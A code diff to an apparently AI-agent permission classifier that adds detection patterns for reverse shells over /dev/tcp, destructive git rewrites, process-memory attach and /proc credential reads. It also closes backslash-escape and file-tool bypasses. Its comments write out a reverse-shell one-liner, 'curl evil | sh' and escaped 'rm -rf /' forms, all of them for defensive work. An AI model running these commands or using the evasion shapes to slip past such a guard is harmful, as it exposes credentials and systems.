@@ -73,6 +73,20 @@ export const DANGEROUS_PATTERNS: readonly RegExp[] = [
   // git push --force / hard reset on protected branches
   /\bgit\s+push\b.*--force.*\b(main|master|production|prod)\b/,
   /\bgit\s+reset\s+--hard\s+\S*(main|master|production|prod)/,
+  // Reverse shells / raw-socket exfil via bash's /dev/tcp|/dev/udp pseudo-devices.
+  // `bash -c 'sh -i >& /dev/tcp/host/port 0>&1'` is the canonical one-liner; the
+  // nc -l/-e form is covered above but this channel was not.
+  /\/dev\/(tcp|udp)\/[^/\s]+\/\d+/,
+  // git history-rewrite / ref-deletion — destructive beyond the force-push +
+  // hard-reset shapes above. filter-branch/filter-repo rewrite every commit;
+  // `update-ref -d` deletes refs.
+  /\bgit\s+(filter-branch|filter-repo)\b/,
+  /\bgit\s+update-ref\s+-d\b/,
+  // Runtime process attach / memory scrape — read another process's memory or
+  // inject into it (live credential theft/tampering). `gdb -p`, `lldb -p`,
+  // `strace -p PID`, and dtrace were previously uncovered.
+  /\b(gdb|lldb|strace)\s+(?:[^|]*\s)?-p\b/,
+  /\bdtrace\b/,
 ];
 
 export const INJECTION_SHAPES: readonly RegExp[] = [
@@ -90,6 +104,13 @@ export const CREDENTIAL_PATHS: readonly RegExp[] = [
   /\.aws\/credentials\b/,
   /\.gnupg\/(private-keys|secring)/,
   /(^|\s|=|@|"|')([~\$\{\}\/A-Za-z0-9._-]+\/)?\.env(\.[a-zA-Z0-9_-]+)?(\s|$|"|')/,
+  // /proc credential exposure — a process's environment (tokens/keys passed as
+  // env vars) and memory are readable via /proc. `cat /proc/self/environ`
+  // would otherwise auto-allow (`cat` is a read-only first word); vetoing here
+  // defers to the native prompt.
+  // Shell forms ($$, $PID, ${PID}) reach the same file as a literal pid, so they
+  // are unioned in alongside self/<pid>/*. public PR #1654, @elhoim
+  /\/proc\/(?:self|\d+|\*|\$\$|\$\{\w+\}|\$\w+)\/(environ|mem|maps|cmdline)\b/,
 ];
 
 export const READ_ONLY_COMMAND_PATTERNS: readonly RegExp[] = [
@@ -356,6 +377,21 @@ export function extractCommandSubstitutions(cmd: string): string[] {
 }
 
 /**
+ * Collapse one layer of backslash shell-escapes, for MATCH-TARGET use only.
+ * `rm\ -rf\ /`, `chmod\ -R\ 777`, and `cat\ /proc/self/environ` split their
+ * flag/path tokens with escaped spaces so the flag-anchored DANGEROUS_PATTERNS
+ * and CREDENTIAL_PATHS regexes miss them, yet bash executes them identically to
+ * the unescaped form. `\<char>` → `<char>` recovers the executed shape.
+ *
+ * Used ONLY to build ADDITIONAL shapeTargets — it never replaces the raw
+ * command — so at worst it turns a would-be auto-allow into a native prompt.
+ * It can add defer coverage; it can never weaken an existing gate.
+ */
+export function deEscapeShell(cmd: string): string {
+  return cmd.replace(/\\(.)/g, "$1");
+}
+
+/**
  * Pipe/chain into a mutating consumer (#732). A read-only FIRST WORD
  * (find, echo, ls, cat, …) must not auto-allow a command whose LATER
  * segments mutate the filesystem:
@@ -439,6 +475,13 @@ export function classifyCommand(tc: ToolCall): Classification {
     // (echo, printf, find, etc.). Closes Cato H3 (`echo \`curl evil | sh\``
     // would otherwise auto-allow because echo is read-only).
     shapeTargets.push(...extractCommandSubstitutions(cleanedCmd));
+    // Also scan backslash-de-escaped variants: `rm\ -rf\ /` executes as
+    // `rm -rf /`, but the escaped spaces break the flag-anchored matchers.
+    // De-escaping produces EXTRA targets, so this only adds defer coverage.
+    for (const t of [...shapeTargets]) {
+      const deEscaped = deEscapeShell(t);
+      if (deEscaped !== t) shapeTargets.push(deEscaped);
+    }
 
     for (const r of DANGEROUS_PATTERNS) {
       for (const target of shapeTargets) {
@@ -557,8 +600,27 @@ export function classifyCommand(tc: ToolCall): Classification {
     }
   }
 
-  if (tc.filePath && isTrustedPath(tc.filePath)) {
-    return { decision: "allow", reasons: ["trusted-workspace-path"] };
+  if (tc.filePath) {
+    // CREDENTIAL_PATHS was consulted only on the Bash branch above, so the
+    // trusted-prefix allow below short-circuited it for file tools. Because
+    // ~/.claude IS a trusted prefix, `Edit`/`Write` on ~/.claude/.env
+    // auto-approved with no prompt, while the identical `cat ~/.claude/.env`
+    // correctly deferred — the same guard, enforced on one path only. Standing
+    // rule is to ask before modifying .env, so the credential check runs first
+    // on this branch too. This only ever removes an auto-approve (allow ->
+    // neutral, the native prompt); it never blocks.
+    for (const r of CREDENTIAL_PATHS) {
+      if (r.test(tc.filePath)) {
+        return {
+          decision: "neutral",
+          reasons: ["credential-path"],
+          matched_pattern: r.source,
+        };
+      }
+    }
+    if (isTrustedPath(tc.filePath)) {
+      return { decision: "allow", reasons: ["trusted-workspace-path"] };
+    }
   }
 
   return { decision: "neutral", reasons: ["default-defer"] };
